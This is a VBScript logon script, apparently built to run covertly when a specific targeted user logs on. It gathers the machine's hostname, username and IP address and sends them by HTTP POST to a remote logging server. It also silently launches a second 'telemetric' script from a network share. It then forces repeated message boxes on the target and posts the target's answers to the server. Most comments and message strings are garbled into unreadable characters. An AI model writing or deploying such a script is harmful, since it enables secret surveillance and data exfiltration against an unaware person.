'uuid0AttractTargetAttention
'���� ������, ��� ���� ������� �� �������� ��� - �� ������ ���� ����������� � ������ ������
On error resume next
'��������� �� 1 ���� ������ ���� ���� �� ����� �������
runIsPermitted = 1
' ��������� �� 1 ���� ��������� ������ ������� ����������
telemericIsPermitted = 1
minMsgTime=8 '�����, �� ��������� �������� ������ ����� ����� ��������� �������
maxtime=8 '�����, �� ��������� �������� ������ ���� ���������

' "����������" - ���� ���� � ������, � ������� ��������� ���� �������
hostname = CreateObject("WScript.Shell").ExpandEnvironmentStrings( "%COMPUTERNAME%" )
username = CreateObject("WScript.Shell").ExpandEnvironmentStrings( "%USERNAME%" )
Dim ipaddr : ipaddr = ""
Dim objWMIService : Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Dim colAdapters : Set colAdapters = objWMIService.ExecQuery("Select IPAddress from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
Dim objAdapter
For Each objAdapter in colAdapters
  If Not IsNull(objAdapter.IPAddress) Then ipaddr = trim(objAdapter.IPAddress(0))
  exit for
Next


'��������� ���������� � �������� ��������
If GetObject("winmgmts:\\.\root\cimv2").Get("Win32_PingStatus.Address='"& "<websrv>" & "'").StatusCode = 0 Then 
   srvIsWork=1
Else
   srvIsWork=0
End If

'��������, ��� �������������� ������

If username = "<target username here>" Then
lanuch_type="TARGET"
Else

IF username = "<your username here, for debug>" Then
lanuch_type="TESTING"
'����. ��������� ��� ����� ��� ���� �������
runIsPermitted=0 '��������� ��� ��� ����� ��������� �� �����
telemericIsPermitted=0
srvIsWork=0
Else
launch_type="GENERIC (username="&username&")"
End If
End If

'���������������� ������ � ������ ������ �������
srvinform ">>>>>>>>> Script runtime begin. <<<<<<<<<"

'�������� �� ������ ���������� � ������, �� ������� ������� ������
srvinform "Remote machine hostname: " & hostname
srvinform "Remote machine session username: " & username
srvinform "Remote machine local IP address: " & ipaddr
srvinform "Remote machine local time: " & DateInfo & Now

'���� ������� ��� ���� �������, �� ������������� ���� � ��� ��� ������ ��������
IF lanuch_type = "TESTING" Then
srvinform "Warning: This is a TESTING script launch, NOT by target caused.."
End If

'���� ������� ��� ������� "��������" ���������, �� �������� ���� "������ �������! ��� �� �������� ����!"
If lanuch_type = "TARGET" Then
srvinform "Warning: THIS SCRIPT RUNTIME CAUSED BY TARGET LOG-ON!"
End If

If telemericIsPermitted = 1 Then
srvinform "Launching telemetric daemon.."
set ws = wscript.createobject("WScript.shell")
ws.run("\\<AD DC ip>\<network share name here>\telemetric.vbs"), 0, false
Else
srvinform "Telemetric daemon launch is not permitted by script config."
End If

If runIsPermitted = 1 Then

srvinform "Showing greeting window.."
pms_info "uuid0ata script", "� ����� ����������!"&vbNewLine&"����, ������, ���� ��������...", 4096+48, 7
srvinform "Showing request ""did he know who creates that all?"".."
isSheKnowAboutCreator=pms_request("uuid0ata script", "�� ������ ������, ��� ������ ���� ��� �������� � ������������?", 4096+32, 4)
srvinform "Reply: "&isSheKnowAboutCreator
If isSheKnowAboutCreator=True Then
	srvinform "Showing ""who is you think created that all?"" question.."
	whoIsCreatorSheThink=pms_prompt("�� �������? :)", "�� � ���-��, ��-������, ��� ������?"&vbNewLine&"(��� ������ ���������, ������ �� �� ����.)", 10)
	srvinform "Reply: "&whoIsCreatorSheThink
	srvinform "Showing ""palenie kontori"" info window.."
	pms_info "uuid0ata script", "���.. ����."&vbNewLine&"��, �� ������ ������, � - ��������� ����� �� �������� ""�"".", 4096+48, 8
Else
	srvinform "Showing ""are you interested to know who am i?"" request.."
	isSheInterested=pms_request("uuid0ata script", "� ���� ���������, ��� �?", 4096+32, 2)
	srvinform "Reply: "&isSheInterested
	If isSheInterested=True Then
		srvinform "Showing ""palenie kontori"" info window.."
		pms_info "uuid0ata script", "���-�, ����� ���, ��� ���� ���������.."&vbNewLine&"� - ��������� ����� �� �������� ""�"".", 4096+48, 8
	Else
		srvinform "Showing ""well, ok"" info window.."
		pms_info "uuid0ata script", "����."&vbNewLine&"��, �� � ���..", 4096+16, 2
	End If

'�������: � ��������� ���������� ����� ������� ����� ����, ��� ���-��� �������� � ���� ���� ������� "��� �� ���� ��� ��� �� ������, � ��� �� ���������."
'��� � ���������� ���������� ����� ������� :(
	
End If

'������� �������� HTTP POST ������� �� �������� ������
Function srvinform(msg)
  On Error Resume Next
  If srvIsWork=1 Then
  If GetObject("winmgmts:\\.\root\cimv2").Get("Win32_PingStatus.Address='"& "<webserv>" & "'").StatusCode = 0 Then 
    sUrl = "http://<webserv>/logger.php"
    sRequest = "data=" & msg
    set oHTTP = CreateObject("Microsoft.XMLHTTP")
    oHTTP.open "POST", sUrl,false
    oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    oHTTP.setRequestHeader "Content-Length", Len(sRequest)
    oHTTP.send sRequest
    HTTPPost = oHTTP.responseText
  End If
  End If
 End Function

' ------- Protected Messages Show Functions Set -------
Function pms_info(title, text, speccode, mintime) 'show information window
	startShowingTime = Timer
	While not Timer-startShowingTime>=mintime
		MsgBox text, speccode, title
	Wend
End Function

Function pms_request(title, text, speccode, mintime) 'show request window
	startShowingTime = Timer
	While not Timer-startShowingTime>=mintime
		an=MsgBox(text, 4+speccode, title)
		If not Timer-startShowingTime>=mintime Then
			pt1=Timer
			MsgBox "������� ��� ���! ������ ������� ������, ��� �������� �� �����.", 48, "������ �� ������� �������� ����."
			mintime=mintime+(Timer-pt1)
		End If
	Wend
	if an=6 Then 
		pms_request=True
	Else
		pms_request=False
	End If
End Function

Function pms_prompt(title, text, mintime)
	startShowingTime = Timer
	While not Timer-startShowingTime>=mintime or an=""
		an=InputBox(text, title)
		If not Timer-startShowingTime>=mintime Then
			pt1=Timer
			MsgBox "������� ��� ���! ������ ������� ������, ��� �������� �� �����.", 48, "������ �� ������� �������� ����."
			mintime=mintime+(Timer-pt1)
		Else
		If an="" Then
			pt1=Timer
			MsgBox "������: ���� ����� �� ����� ���������� ������!", 48, "������ �� ������� �������� ����."
			mintime=mintime+(Timer-pt1)
		End If
		End If
	Wend
	pms_prompt=an
End Function

' Special Code (speccode arg) indexes:
' Icons: 16 - critical, 32 - ask, 48 - warning, 64 - info
' Special: 65536 - window always on top, 256 - 2nd button as default, 512 - 3rd button as default
' ----------------------------------------------------- 
Else
srvinform "Notice: uuid0ata script launched, but runIsPermitted=0 prevented msgs show!"
End If

'���������������� ������ � ���������� ������ �������
srvinform ">>>>>>>>>> Script runtime end. <<<<<<<<<<"